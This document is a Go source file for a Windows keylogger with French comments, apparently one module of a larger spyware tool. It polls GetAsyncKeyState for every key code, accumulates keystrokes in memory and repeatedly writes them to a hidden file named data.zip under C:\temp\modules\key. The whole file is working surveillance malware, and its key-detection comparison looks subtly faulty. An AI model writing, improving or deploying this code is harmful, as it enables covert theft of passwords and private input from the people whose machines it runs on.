package keylogger

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"syscall"
	"time"
)

// Importation de la DLL et déclaration de la fonction GetAsyncKeyState
var (
	user32          = syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
)

func Keylogger(Content *string) {
	// Chemin du fichier
	filePath := "C:\\temp\\modules\\key\\data.zip"

	// Créer le répertoire si nécessaire
	dir := filepath.Dir(filePath)
	err := os.MkdirAll(dir, os.ModePerm)
	if err != nil {
		log.Printf("[%s] Erreur lors de la création du répertoire: %v\n", time.Now().Format(time.RFC3339), err)
		return
	}

	lastContent := "" // Garder une trace du contenu précédent

	for {
		time.Sleep(10 * time.Millisecond) // Ajouter une pause de 10ms pour éviter une utilisation excessive du CPU

		// Vérifier si le contenu a changé depuis la dernière itération
		if *Content != lastContent {
			// Écrire dans le fichier uniquement si le contenu a changé
			err := writeToFile(filePath, *Content)
			if err != nil {
				log.Printf("[%s] Erreur lors de l'écriture dans le fichier: %v\n", time.Now().Format(time.RFC3339), err)
				return
			}
			lastContent = *Content
		}

		for KEY := 0; KEY <= 190; KEY++ {
			Val, _, _ := getAsyncKeyState.Call(uintptr(KEY))
			if int(Val) == -32767 {
				(*Content) += string(KEY)
			}
		}
	}
}

func writeToFile(filePath, content string) error {
	// Écrire dans le fichier
	err := ioutil.WriteFile(filePath, []byte(content), 0644)
	if err != nil {
		return err
	}
	return nil
}
